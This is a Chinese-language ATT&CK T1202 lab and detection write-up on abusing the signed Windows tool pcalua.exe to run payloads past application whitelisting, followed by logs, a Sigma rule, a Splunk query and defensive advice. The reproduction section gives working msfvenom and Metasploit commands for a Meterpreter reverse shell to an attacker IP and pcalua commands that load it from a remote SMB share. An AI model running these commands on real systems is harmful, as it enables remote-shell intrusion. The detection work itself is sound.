# T1202-间接命令执行-基于Pcalua执行Payload(白名单)

## 描述

攻击者可利用Windows实用程序（如`pcalua.exe`）间接执行命令，绕过防御机制。`pcalua.exe`是程序兼容性助手（ProgramCompatibilityAssistant）的组件，位于`C:\Windows\System32\`，由Microsoft签名，包含在系统`PATH`环境变量中。它用于以兼容模式运行程序，但可被滥用通过`-a`参数直接执行任意可执行文件，包括本地或远程文件。

此技术通过合法签名工具（如`pcalua.exe`）代理执行恶意Payload，绕过应用程序白名单（如AppLocker）或防病毒检测，常用于初始访问后的持久化、权限提升或横向移动。

## 测试案例

### 测试案例1：Pcalua执行本地或远程Payload
`pcalua.exe`通过`-a`参数执行可执行文件，支持本地路径或远程SMB共享路径。以下为测试案例：

**命令**：
- 本地加载：
  ```cmd
  pcalua -m -a C:\Users\<username>\Desktop\shell.exe
  ```
- 远程加载：
  ```cmd
  pcalua -m -a \\192.168.126.146\share\shell.exe
  ```

- **说明**：
  - `-m`：以兼容模式运行（可选）。
  - `-a`：指定要执行的可执行文件路径。
  - `shell.exe`：恶意Payload，测试中可替换为反弹Shell。
- **权限**：无需提升权限，普通用户可执行。

### 补充说明
- 日志监控：
  - 在高版本Windows（如Windows7及以上），可通过组策略启用进程命令行参数记录：
    - 路径：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`
  - 部署Sysmon，记录进程创建和网络活动。
- 局限性：
  - 默认Windows日志可能不记录完整命令行，需启用审核策略。
  - 合法程序兼容性操作可能触发类似日志，需结合上下文分析。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`pcalua.exe`及其子进程的执行信息。
  - 事件ID5156：网络连接，记录Payload的出站连接。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID7：映像加载，记录加载的DLL。
  - 事件ID10：进程访问，记录子进程调用。
- 网络监控：
  - 检测`pcalua.exe`或其子进程发起的异常网络连接（如反弹Shell）。
- 文件监控：
  - 检测非标准路径下的可执行文件或SMB共享访问。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：Windows7
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）
  - Samba（远程共享Payload）

### 攻击分析

#### 测试1：Pcalua执行Payload
1. **生成Payload**：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=6666 -f exe -o shell.exe
   ```

2. **配置Samba共享（远程加载）**：
   - 在攻击机上设置SMB共享：
     ```bash
     sudo apt-get install samba
     sudo nano /etc/samba/smb.conf
     ```
     添加：
     ```
     [share]
     path = /path/to/share
     writable = yes
     guest ok = yes
     ```
     - 复制`shell.exe`到共享目录：
       ```bash
       cp shell.exe /path/to/share/
       sudo systemctl restart smbd
       ```

3. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 6666
   msf5 exploit(multi/handler)>exploit
   ```

4. **靶机执行Payload**：
   - 本地加载：
     ```cmd
     pcalua -m -a C:\Users\12306Br0\Desktop\shell.exe
     ```
   - 远程加载：
     ```cmd
     pcalua -m -a \\192.168.126.146\share\shell.exe
     ```

5. **结果分析**：
   - 成功：获得Meterpreter会话，`getuid`显示用户为`12306Br0-PC\12306Br0`。
   - 失败可能原因：
     - 防火墙阻止TCP连接。
     - SMB共享未正确配置（需检查权限或防火墙）。
     - Payload架构不匹配（需生成32位Payload以适配Windows7）。

## 测试留痕

### Windows安全日志
- 事件ID4688：
  ```
  进程信息:
    新进程ID:0x864
    新进程名称:C:\Windows\System32\pcalua.exe
    命令行:pcalua -m -a C:\Users\12306Br0\Desktop\a\shell.exe
  ```
  ```
  进程信息:
    新进程ID:0xaf4
    新进程名称:C:\Users\12306Br0\Desktop\a\shell.exe
    命令行:"C:\Users\12306Br0\Desktop\a\shell.exe"
  ```
- 事件ID5156：
  ```
  应用程序信息:
    进程ID:2804
    应用程序名称:\device\harddiskvolume2\users\12306br0\desktop\a\shell.exe
  网络信息:
    方向:出站
    源地址:192.168.126.149
    源端口:49163
    目标地址:192.168.126.146
    目标端口:6666
  ```

### Sysmon日志
- 事件ID1：
  ```
  事件ID:1
  OriginalFileName:pcalua.exe
  CommandLine:pcalua -m -a C:\Users\12306Br0\Desktop\a\shell.exe
  CurrentDirectory:C:\Users\12306Br0\
  User:12306Br0-PC\12306Br0
  Hashes:SHA1=280038828C2412F3867DDB22E07759CB26F7D8EA
  ParentImage:C:\Windows\System32\cmd.exe
  ```
  ```
  事件ID:1
  OriginalFileName:shell.exe
  CommandLine:"C:\Users\12306Br0\Desktop\a\shell.exe"
  CurrentDirectory:C:\Users\12306Br0\
  User:12306Br0-PC\12306Br0
  Hashes:SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
  ParentImage:C:\Windows\System32\pcalua.exe
  ```

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`pcalua.exe`的执行，尤其是非程序兼容性场景中的调用。
   - 检查命令行是否包含`-a`和可执行文件路径（本地或远程）。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     pcalua\.exe.*-a.*(\.exe|\\)
     ```
3. 网络监控：
   - 检测`pcalua.exe`或其子进程发起的异常网络连接（如TCP6666）。
   - 监控SMB共享访问（如`\\192.168.126.146\share`）。
4. 文件监控：
   - 检测非系统路径下的可执行文件或远程共享中的文件。
5. 行为分析：
   - 检测`pcalua.exe`触发子进程的异常行为。

### Sigma规则
新增Sigma规则以增强检测：
```yaml
title:可疑Pcalua.exe执行Payload
id:9e8f0a1b-2c3d-4e5f-6b7c-8d9e0a1b2c3d
description:检测pcalua.exe执行本地或远程可执行文件，可能用于代理恶意代码
status:experimental
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|endswith:'\pcalua.exe'
    CommandLine|contains:'-a'
  filter_legitimate:
    CommandLine|contains:
      - 'C:\ProgramFiles\'
      - 'C:\ProgramFiles(x86)\'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的程序兼容性操作
level:high
tags:
  - attack.execution
  - attack.t1202
```

规则说明：
- 目标：检测`pcalua.exe`使用`-a`参数执行可执行文件。
- 过滤：排除程序安装目录（如`C:\ProgramFiles`）中的合法操作。
- 日志来源：Windows事件ID4688（需启用命令行审核）或Sysmon事件ID1。
- 误报处理：合法兼容性操作可能触发，需结合文件路径和网络行为分析。
- 级别：标记为“高”优先级，因`pcalua.exe`滥用通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\pcalua.exe" CommandLine="*-a*")
OR (EventCode=10 SourceImage="*\pcalua.exe" TargetImage="*.exe")
OR (EventCode=3 Initiated="true" SourceImage="*\pcalua.exe" DestinationPort IN ("445","6666"))
| fields Image,CommandLine,ParentImage,User,TargetImage,DestinationIp,DestinationPort
```

规则说明：
- 检测`pcalua.exe`的异常执行（事件ID1）、触发的子进程（事件ID10）和网络连接（事件ID3）。
- 减少误报：结合命令行、子进程和网络行为分析。

### 检测挑战
- 误报：合法程序兼容性操作可能触发，需结合上下文（如文件路径、父进程）。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审核策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`pcalua.exe`的规则，监控进程创建和网络活动。
2. 网络隔离：
   - 限制非必要主机的出站连接，尤其是高危端口（如6666）。
   - 禁用或限制非必要的SMB共享访问。
3. 文件审查：
   - 定期扫描非系统路径下的可执行文件，检查文件哈希。
4. 权限控制：
   - 限制普通用户执行`pcalua.exe`的权限。
5. 安全更新：
   - 保持Windows系统更新，修复潜在漏洞。

## 参考推荐
- MITREATT&CKT1202:  
  <https://attack.mitre.org/techniques/T1202/>
- 渗透测试-基于白名单执行Payload--Pcalua:  
  <https://blog.csdn.net/qq_17204441/article/details/89881795>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
